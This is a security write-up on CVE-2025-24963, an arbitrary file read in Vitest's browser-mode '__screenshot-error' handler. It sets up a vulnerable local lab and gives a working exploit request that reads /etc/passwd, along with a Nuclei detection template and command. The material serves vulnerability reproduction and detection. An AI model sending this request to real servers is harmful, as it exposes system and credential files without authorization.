# CVE-2025-24963: Vitest Browser Mode - Local File Read

## Description:
Vitest is a testing framework powered by Vite. The `__screenshot-error` handler on the browser mode HTTP server that responds any file on the file system. Especially if the server is exposed on the network by `browser.api.host- true`, an attacker can send a request to that handler from remote to get the content of arbitrary files.This `__screenshot-error` handler on the browser mode HTTP server responds any file on the file system. This code was added by commit `2d62051`. Users explicitly exposing the browser mode server to the network by `browser.api.host- true` may get any files exposed. This issue has been addressed in versions 2.1.9 and 3.0.4. Users are advised to upgrade.

## Reference:
- https://nvd.nist.gov/vuln/detail/CVE-2025-24963
- https://github.com/advisories/GHSA-8gvc-j273-4wm5

## Vulnerable Setup

- cd /tmp && mkdir vitest && cd vitest
- npm install -D @vitest/browser@3.0.0
- npx vitest@3.0.0 init browser (press 'y' and continue)
- change, vitest.config.ts file to

```typescript
import { defineConfig } from 'vitest/config'
export default defineConfig({
  test: {
    browser: {
      provider: 'playwright', // or 'webdriverio'
      enabled: true,
      // at least one instance is required
      instances: [
        { browser: 'chromium' },
      ],
    },
  }
})
```

- Run npm run test:browser

- It opens up a chromium browser with `http://localhost:63315/` URL Loaded.

## Exploitation Steps

- Send a `GET` request to `/__screenshot-error?file=/etc/passwd` to check if the server improperly exposes sensitive system files, potentially leading to Local File Inclusion (LFI) or Arbitrary File Read vulnerabilities.

![image](https://github.com/user-attachments/assets/b6627a69-b3fe-47d2-8005-b0a1d6727134)

## Steps to Write Nuclei Template

```yaml
http:
  - raw:
      - |
        GET /__screenshot-error?file=/etc/passwd HTTP/1.1
        Host: {{Hostname}}
        Accept: */*

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
          - "contains(content_type,'image/png')"
          - "contains_all(body,'root',':*:','/bin/')"
        condition: and
```

- Sends a `GET` request to `/__screenshot-error?file=/etc/passwd` to attempt reading the /etc/passwd file.

- Ensures the server responds with a `200` status code, confirming a successful request.

- Checks if the response has `image/png` as the Content-Type, indicating that the server is returning the requested file as an image.

- Verifies that the response body contains the expected patterns from `/etc/passwd`, including `"root", ":*:", and "/bin/"`, confirming successful file retrieval.

## Nuclei Template URL : [CVE-2025-24963](https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2025/CVE-2025-24963.yaml)

## Nuclei Command :

```bash
nuclei -t CVE-2025-24963.yaml -u http://localhost:63315 -vv
```

![image](https://github.com/user-attachments/assets/8c762804-5341-40d3-94e3-f31a5fd13bf8)
